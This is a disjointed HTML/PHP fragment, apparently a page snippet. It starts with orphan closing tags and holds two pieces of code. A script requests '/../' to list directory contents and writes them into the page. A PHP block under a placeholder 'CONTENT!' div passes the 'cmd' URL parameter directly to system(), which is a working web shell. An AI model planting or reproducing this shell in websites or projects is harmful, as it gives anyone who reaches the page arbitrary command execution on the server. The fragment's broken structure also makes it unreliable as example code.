</div>
</code>

<script>
  var directory = "/../";
  var xmlHttp = new XMLHttpRequest();
  xmlHttp.open('GET', directory, true); // false for synchronous request
  xmlHttp.send(null);
  var ret = xmlHttp.responseText;
  var fileList = ret.split('\n');
  
  document.write("<div>"+fileList+"</div>");
  
  for (i = 0; i < fileList.length; i++) {
       document.write("<div>" + i + "</div><br/>");

  }
</script> 

<div>
 
 CONTENT!
 

      <pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>  
